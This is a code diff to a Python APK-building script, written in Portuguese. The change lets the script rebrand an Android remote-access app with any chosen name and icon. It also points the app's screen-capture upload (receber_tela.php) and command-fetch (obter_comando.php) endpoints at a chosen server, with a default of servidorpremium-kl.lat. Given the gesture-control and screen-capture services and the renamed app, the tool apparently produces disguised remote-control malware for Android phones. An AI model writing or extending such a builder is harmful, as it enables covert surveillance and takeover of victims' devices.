@@ -149,14 +149,31 @@ def copiar_projeto_android(origem, destino):
 
 
 def atualizar_nome_app(projeto_dir, nome_app):
-    strings_path = os.path.join(
+    personalizar_marca_apk(
         projeto_dir,
-        "app",
-        "src",
-        "main",
-        "res",
-        "values",
-        "strings.xml",
+        nome_app,
+        os.environ.get("APK_URL_PADRAO", "https://servidorpremium-kl.lat"),
+    )
+
+
+def normalizar_url_servidor(url):
+    url = (url or "").strip().rstrip("/")
+    if not url:
+        raise ValueError("URL do servidor obrigatoria")
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    return url
+
+
+def extrair_host_url(url):
+    from urllib.parse import urlparse
+
+    return urlparse(url).netloc or url.replace("https://", "").replace("http://", "").split("/")[0]
+
+
+def atualizar_string_xml(projeto_dir, chave, valor):
+    strings_path = os.path.join(
+        projeto_dir, "app", "src", "main", "res", "values", "strings.xml"
     )
     if not os.path.exists(strings_path):
         raise FileNotFoundError("strings.xml nao encontrado no projeto Android")
@@ -164,16 +181,96 @@ def atualizar_nome_app(projeto_dir, nome_app):
     with open(strings_path, "r", encoding="utf-8") as arquivo:
         conteudo = arquivo.read()
 
-    nome_seguro = escape(nome_app.strip())
-    conteudo = re.sub(
-        r"<string name=\"app_name\">.*?</string>",
-        f'<string name="app_name">{nome_seguro}</string>',
-        conteudo,
-        count=1,
-    )
+    valor_seguro = escape(str(valor).strip())
+    padrao = rf'<string name="{re.escape(chave)}">.*?</string>'
+    substituto = f'<string name="{chave}">{valor_seguro}</string>'
+    if re.search(padrao, conteudo):
+        conteudo = re.sub(padrao, substituto, conteudo, count=1)
+    else:
+        conteudo = conteudo.replace(
+            "</resources>", f"    {substituto}\n</resources>"
+        )
 
     with open(strings_path, "w", encoding="utf-8") as arquivo:
         arquivo.write(conteudo)
+
+
+def substituir_em_arquivos(projeto_dir, rel_paths, substituicoes):
+    for rel in rel_paths:
+        caminho = os.path.join(projeto_dir, rel.replace("/", os.sep))
+        if not os.path.exists(caminho):
+            continue
+        with open(caminho, "r", encoding="utf-8") as arquivo:
+            conteudo = arquivo.read()
+        for antigo, novo in substituicoes.items():
+            if antigo:
+                conteudo = conteudo.replace(antigo, novo)
+        with open(caminho, "w", encoding="utf-8") as arquivo:
+            arquivo.write(conteudo)
+
+
+def aplicar_regex_em_arquivos(projeto_dir, rel_paths, padroes):
+    for rel in rel_paths:
+        caminho = os.path.join(projeto_dir, rel.replace("/", os.sep))
+        if not os.path.exists(caminho):
+            continue
+        with open(caminho, "r", encoding="utf-8") as arquivo:
+            conteudo = arquivo.read()
+        for padrao, substituto in padroes:
+            conteudo = re.sub(padrao, substituto, conteudo)
+        with open(caminho, "w", encoding="utf-8") as arquivo:
+            arquivo.write(conteudo)
+
+
+def personalizar_marca_apk(projeto_dir, nome_app, url_servidor, descricao_servico=None):
+    nome_app = (nome_app or "").strip()
+    if not nome_app:
+        raise ValueError("Nome do aplicativo obrigatorio")
+
+    url_servidor = normalizar_url_servidor(url_servidor)
+    host = extrair_host_url(url_servidor)
+    descricao = (descricao_servico or f"Servico remoto {nome_app}").strip()
+    nome_js = nome_app.replace("\\", "\\\\").replace('"', '\\"')
+
+    atualizar_string_xml(projeto_dir, "app_name", nome_app)
+    atualizar_string_xml(projeto_dir, "servico_descricao", descricao)
+
+    kotlin_arquivos = [
+        "app/src/main/java/com/meuacesso/remoto/ControleGestosService.kt",
+        "app/src/main/java/com/meuacesso/remoto/Constantes.kt",
+        "app/src/main/java/com/meuacesso/remoto/CapturaTelaService.kt",
+        "app/src/main/java/com/meuacesso/remoto/MainActivity.kt",
+    ]
+
+    aplicar_regex_em_arquivos(
+        projeto_dir,
+        kotlin_arquivos,
+        [
+            (r'const val URL_VPS = "https?://[^"]+"', f'const val URL_VPS = "{url_servidor}"'),
+            (r'const val SERVIDOR_HOST = "[^"]+"', f'const val SERVIDOR_HOST = "{host}"'),
+            (
+                r'private const val URL_ENVIO_TELA = "https?://[^"]+"',
+                f'private const val URL_ENVIO_TELA = "{url_servidor}/receber_tela.php"',
+            ),
+            (
+                r'private const val URL_BUSCAR_COMANDO = "https?://[^"]+"',
+                f'private const val URL_BUSCAR_COMANDO = "{url_servidor}/obter_comando.php"',
+            ),
+            (
+                r'\.setContentTitle\("[^"]+"\)',
+                f'.setContentTitle("{nome_js} Ativo")',
+            ),
+        ],
+    )
+
+    substituir_em_arquivos(
+        projeto_dir,
+        ["app/src/main/java/com/meuacesso/remoto/MainActivity.kt"],
+        {
+            "KL Acesso Remoto": nome_app,
+            "Procure por: KL Acesso Remoto": f"Procure por: {nome_app}",
+        },
+    )
 
 
 def limpar_recursos_icone_antigos(res_dir):
@@ -394,10 +491,12 @@ def executar_gradle(projeto_dir):
         raise RuntimeError(f"Gradle falhou: {detalhe}")
 
 
-def gerar_apk(nome_app, caminho_icone=None):
+def gerar_apk(nome_app, caminho_icone=None, url_servidor=None, descricao_servico=None):
     nome_app = (nome_app or "").strip()
     if not nome_app:
         raise ValueError("Nome do aplicativo obrigatorio")
+    if not url_servidor:
+        raise ValueError("URL do servidor obrigatoria")
 
     projeto_origem = encontrar_projeto_android()
     if not projeto_origem:
@@ -427,7 +526,12 @@ def gerar_apk(nome_app, caminho_icone=None):
         copiar_projeto_android(projeto_origem, projeto_build)
         criar_local_properties(projeto_build)
         otimizar_gradle_para_vps(projeto_build)
-        atualizar_nome_app(projeto_build, nome_app)
+        personalizar_marca_apk(
+            projeto_build,
+            nome_app,
+            url_servidor,
+            descricao_servico=descricao_servico,
+        )
         if caminho_icone and os.path.exists(caminho_icone):
             aplicar_icone_personalizado(projeto_build, caminho_icone)
 
